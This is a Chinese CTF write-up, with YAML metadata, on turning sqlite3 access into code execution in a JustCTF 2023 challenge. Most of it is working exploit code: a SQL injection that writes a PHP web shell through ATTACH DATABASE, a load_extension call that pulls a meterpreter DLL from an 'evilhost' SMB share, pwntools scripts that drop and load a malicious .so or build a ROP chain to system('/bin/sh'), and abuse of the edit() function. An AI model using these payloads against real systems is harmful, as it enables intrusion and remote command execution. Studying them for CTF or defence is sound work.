---
title: 从JustCTF 2023中学到的sqlite3代码执行方法
contest: JustCTF 2023
year: 2023
difficulty: hard
vuln_type: rce
tags:
- sqlite3
- load_extension
- writefile
- FFI
- 沙箱逃逸
- ROP
- libc.so.6
- '.open :memory:'
- edit函数
attack_chain:
- '路径 1: load_extension SMB 共享 `\evilhost\share\meterpreter.dll` 加载 Windows 攻击载荷'
- '路径 2: CREATE TABLE images + cast x''hex'' as text 写入 .so 字节'
- 用 SELECT writefile('./exp.so', img) 把 BLOB 落地
- SELECT load_extension('./exp', 'exp') 加载 .so 触发 _init
- '路径 3 (作者解): load_extension(''/lib/x86_64-linux-gnu/libc.so.6'', ''puts'') 泄 libc'
- 计算 pie_base 后用 gets+system 构造 ROP
- heap+0x11eb0+system_plt 把 argv 指向 '/bin/sh
- '路径 4: .open :memory: 创建内存数据库'
- sqlite3_create_function 注册 edit(zCmd, zTempFile) 自定义函数
- update t set b=edit('','/jailed/readflag') 调用 system
key_payload: '''justCTF{SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1}'''
one_liner: sqlite3 三种代码执行姿势：load_extension SMB / writefile 落 .so / 自定义函数 .open :memory:。
lesson: 'sqlite3 的 load_extension 允许任意 .so/.dll，是 PWN 题沙箱逃逸金钥匙；.open :memory: 可绕过文件权限，结合 sqlite3_create_function 注册 system 调用是 CTF 隐藏赛道。'
quality: high
full_path: 从JustCTF_2023_中学到的一点关于_sqlite3_代码执行的方法.full.md
meta_path: 从JustCTF_2023_中学到的一点关于_sqlite3_代码执行的方法.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: '从JustCTF 2023中学到的sqlite3代码执行方法。sqlite3 三种代码执行姿势：load_extension SMB / writefile 落 .so / 自定义函数 .open :memory:。。关键路径：路径 1: load_extension SMB 共享 `\evilhost\share\meterpreter.dll` 加载 Windows 攻击载荷 ...'
category: web
subcategory: rce
tools_used:
- ROP
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/117905.html
reasoning_chain:
- 题目提供 sqlite3 命令注入 ?id=bob'; ATTACH DATABASE → 触发点：sqli 写文件
- '路径 1: load_extension SMB 共享 \\evilhost\share\meterpreter.dll 加载 Windows 攻击载荷'
- '路径 2: CREATE TABLE images(c BLOB) + SELECT writefile(''./exp.so'', img) 落 .so'
- 动作：load_extension('./exp', 'exp') 触发 _init 入口 → RCE
- '路径 3 (作者解): load_extension(''/lib/x86_64-linux-gnu/libc.so.6'', ''puts'') 泄 libc'
- 假设：加载 libc 作 extension 后符号表可见 → 动作：计算 pie_base + ROP
- heap+0x11eb0+system_plt 把 argv 指向 '/bin/sh'
- '路径 4: .open :memory: 创建内存数据库 → sqlite3_create_function 注册 edit(zCmd, zTempFile)'
- update t set b=edit('','/jailed/readflag') 调用 system
failed_attempts:
- 试图用 .import 写文件 → 失败：.import 受限
- 试图直接拼 shellcode 注入 → 失败：sqlite3 不是 shell
- 试图用 ATTACH 直接写 /flag → 失败：readflag 需要 token
key_observations:
- sqlite3 的 load_extension 允许任意 .so/.dll，是 PWN 题沙箱逃逸金钥匙
- '.open :memory: 可绕过文件权限，结合 sqlite3_create_function 注册 system 调用是 CTF 隐藏赛道'
- libc.so.6 作 extension 暴露符号可用来泄地址
- ATTACH DATABASE 写文件是 sqli 写 webshell 经典手法
prerequisites:
- sqlite3 SQL 注入与 ATTACH DATABASE 写文件
- load_extension 加载 .so 原理
- ROP gadget 构造（system + /bin/sh）
- sqlite3_create_function 自定义函数机制
---
# 从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法

> 原文: https://www.ctfiot.com/117905.html
> ID: 117905


```
1
2
3
?id=bob'; ATTACH DATABASE '/var/www/lol.php' AS lol; CREATE TABLE lol.pwn
(dataz text); INSERT INTO lol.pwn (dataz) VALUES ('<? system($_GET['cmd']);
?>';--
1
2
?name=123 UNION SELECT
1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
from pwn import *
context.log_level='debug'
context.arch='amd64'
    #context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./pwn')
import binascii
p = remote("0.0.0.0",13337)
ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
sla(b"> ",b"CREATE TABLE images(name TEXT, type TEXT, img BLOB);")
with open("./exp.so",'rb') as f:
 dt = f.read()
sla(b"> ",b"INSERT INTO images(name,type,img)")

dt = binascii.hexlify(dt)
# warning(chr(dt[1]))

print(dt.decode())
# input()

sla(b"> ",f"VALUES('icon','jpeg',cast(x'{dt.decode()}' as text));")
sla(b"> ",b"SELECT writefile('./exp.so',img) FROM images WHERE name='icon';")
# print(hex(int(p.readline())))
sla(b"> ",b"select Load_extension('./exp','exp');")
p.interactive()
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
from pwn import *

# p = process("./sqlite3")
    #context.log_level='debug'
    #p = remote("0.0.0.0",13339)
p = remote('notabug2.nc.jctf.pro', 1337)
ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

sla(b"lite>",b"select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','puts');")
ru(": \n")
lic = u64(p.recvn(6).ljust(8,b'\x00'))
warning(hex(lic))
pie_base = lic - 0x1589a0

heap = 0x00005555556b0000-0x0000555555554000+pie_base # 1/0x2000

# system_plt = (pie_base+0x2228C)
system_plt = pie_base + 0x10910
if pie_base > 0x600000000000:
 p.close()
warning(hex(pie_base)) #lic+0x28b8
sla(b"lite>",b"select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','gets');")
p.sendline(p64(heap+0x11eb0)+b'a'*0x8+p64(pie_base+0x000000000009e0ad))
# raw_input()
dt = b"/bin/sh\0"+flat([0]*8)+ flat([0]*8)+ p64(system_plt)
sla(b"lite> ",f"select cast(x'{dt.hex()}' as text), ".encode()+b"Load_extension('"+p64(system_plt)[:6]+b"','/bin/sh');")
p.sendline(b"echo n132")
# p.interactive()
data = p.read(timeout=1)
if b'n132' in data:
 p.sendline("/jailed/readflag")
 input()
 p.interactive()
else:
 p.close()
1
.system CMD ARGS…	Run CMD ARGS… in a system shell
1
2
3
4
# root @ pwnable in /tmp/private [14:10:59]
$ cat run-sqlite.sh
#!/bin/bash
sed -ue '/^\./ { /^\.open/!d; }' | /jailed/sqlite3 -interactive
#
1
2
3
4
select load_extension('/lib/x86_64-linux-gnu/libc-2.31', 'getchar');
 .system /jailed/readflag
Runtime error: error during initialization:
justCTF{SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1}
1
2
sqlite3_create_function(p->db, "edit", 2, SQLITE_UTF8, 0,
 editFunc, 0, 0);
1
2
3
4
5
6
7
zCmd = sqlite3_mprintf("%s \"%s\"", zEditor, zTempFile);
if( zCmd==0 ){
 sqlite3_result_error_nomem(context);
 goto edit_func_end;
}
rc = system(zCmd);
sqlite3_free(zCmd);
1
2
3
4
5
6
sqlite> .open :
memory:
sqlite> CREATE TABLE t(a INT, b VARCHAR(200));
sqlite> insert into t values (0, '');
sqlite> update t set b=edit('','/jailed/readflag') where a=0;
justCTF{SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1}
```
